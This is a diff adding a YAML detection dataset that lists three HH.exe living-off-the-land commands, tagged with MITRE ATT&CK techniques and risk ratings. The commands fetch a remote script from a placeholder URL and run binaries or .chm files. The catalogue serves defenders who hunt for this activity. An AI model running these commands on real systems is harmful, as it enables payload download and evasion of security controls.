@@ -1,0 +1,63 @@
+- command: HH.exe http://some.url/script.ps1
+  description: Downloads and saves the target file from a remote URL.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+    Defense Evasion:
+      - T1218.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Hh/
+  risk: High
+  risk_reason: Normal users have little use for this utility and calling remote files.
+  fidelity: High
+  fidelity_reason: This is typically a very rare type of command to see in most organizations.
+  tool: hh
+  threatactors:
+    N/A:
+      - N/A
+- command: HH.exe c:\windows\system32\calc.exe
+  description: Execute a target binary - in this case calc.exe.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+    Defense Evasion:
+      - T1218.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Hh/
+  risk: High
+  risk_reason: Normal users have little use for this utility and calling remote files.
+  fidelity: High
+  fidelity_reason: This is typically a very rare type of command to see in most organizations.
+  tool: hh
+  threatactors:
+    N/A:
+      - N/A
+- command: HH.exe C:\somefile.chm
+  description: Execute a target Compiled Help file containing malicious commands.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+    Defense Evasion:
+      - T1218.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Hh/
+  risk: High
+  risk_reason: Normal users have little use for this utility and calling non-standard .chm files.
+  fidelity: High
+  fidelity_reason: This is typically a very rare type of command to see in most organizations.
+  tool: hh
+  threatactors:
+    N/A:
+      - N/A
